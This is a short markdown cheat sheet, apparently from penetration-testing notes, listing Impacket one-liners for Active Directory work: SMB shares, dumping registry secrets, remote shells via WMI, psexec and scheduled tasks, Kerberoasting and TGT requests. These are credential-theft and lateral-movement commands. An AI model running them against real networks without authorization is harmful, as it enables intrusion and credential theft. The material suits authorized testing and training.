# Impacket

Frequently used Impacket one-liners.

### SMB shares

```bash
smbclient.py <DOMAIN>/<USER>:<PASSWORD>@<HOST>
```

**Tool:** Impacket · **Platform:** Linux · **Tags:** SMB, Shares · **Context:** Domain user

### Remote registry secrets

```bash
secretsdump.py <DOMAIN>/<USER>:<PASSWORD>@<HOST>
```

**Tool:** Impacket · **Platform:** Linux · **Tags:** Credentials, Remote Registry · **Context:** Domain user

### WMI shell

```bash
wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<HOST>
```

**Tool:** Impacket · **Platform:** Linux · **Tags:** WMI, Execution · **Context:** Domain user

### SMB service execution

```bash
psexec.py <DOMAIN>/<USER>:<PASSWORD>@<HOST>
```

**Tool:** Impacket · **Platform:** Linux · **Tags:** SMB, Execution · **Context:** Domain user

### Scheduled task execution

```bash
atexec.py <DOMAIN>/<USER>:<PASSWORD>@<HOST> "whoami"
```

**Tool:** Impacket · **Platform:** Linux · **Tags:** Task Scheduler, Execution · **Context:** Domain user

### Request service ticket

```bash
GetUserSPNs.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request
```

**Tool:** Impacket · **Platform:** Linux · **Tags:** Kerberos, SPN · **Context:** Domain user

### Request TGT

```bash
getTGT.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP>
```

**Tool:** Impacket · **Platform:** Linux · **Tags:** Kerberos, TGT · **Context:** Domain user

---

**Related:** [Overview](./) · [Httpx Katana](httpx-katana.md) · [John](john.md)
